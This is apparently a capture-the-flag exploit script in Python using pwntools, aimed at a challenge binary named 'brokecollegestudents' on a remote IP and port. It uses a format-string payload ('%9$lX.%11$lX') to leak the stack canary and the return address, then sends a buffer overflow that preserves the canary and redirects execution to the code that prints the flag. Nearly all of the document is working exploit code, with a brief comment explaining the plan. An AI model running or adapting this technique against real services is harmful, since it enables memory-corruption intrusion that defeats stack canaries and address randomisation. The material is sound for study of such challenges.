# Python3
# RazviOverflow

from pwn import *

#binary = process("./brokecollegestudents")
binary = remote("143.198.184.186", 5001)
static = ELF("./brokecollegestudents")

'''
Exploit idea:
	Since the binary is an infinite loop of itself, call several times catch()
	In the first format string -> try to find out the position of the user input (rbp-0x20)
	In the next format string -> leak the canary and the original return address of the function
	In the next format string -> calculate the offset from the original return value to 0x000014f1, in order to know where to jump, and overflow the function with both the canary
	and the new direction 

Choice secuence:
	1
	1
	1

Format string positioins:
ABCD.%X.%X.%X.%X.%X.%X.%X.%X....
ABCD.F3F3F2A0.0.A4CC1603.62.6.44434241.....
0    1        2 3        4  5 6
User input is at 6th position (rbp-0x20) so:
Canary is at 9th position (0x20 - 0x8 = 0x18 (24) / 8 = 3)
Ret address is at 11th position (canary + 2 positions)
payload= %9$lX.%11$lX
'''

original_catch_ret_address = 0x0000188c
original_lea_rdi_cat_flag = 0x000014f1
static_offset = original_catch_ret_address - original_lea_rdi_cat_flag

# First iteration
for i in range(3):
	print(binary.recv())
	binary.sendline("1")

print(binary.recv())
payload = "%9$lX.%11$lX"
binary.sendline(payload)
print(binary.recvline())
response = binary.recv()
print(response)
response = response.split(b"What")[0]
response  = response.split(b".")
canary = int(response[0], 16)
dynamic_original_ret_address = int(response[1], 16)

print("CANARY IS: {}\nORIGINAL RET ADDRESS IS: {}".format(hex(canary), hex(dynamic_original_ret_address)))

dynamic_lea_rdi_cat_flag = dynamic_original_ret_address - static_offset

payload = b"A" * (0x20-0x8) + p64(canary) + b"B" * 0x8 + p64(dynamic_lea_rdi_cat_flag)

for i in range(3):
	binary.sendline("1")
	print(binary.recv())
	

binary.sendline(payload)

binary.interactive()
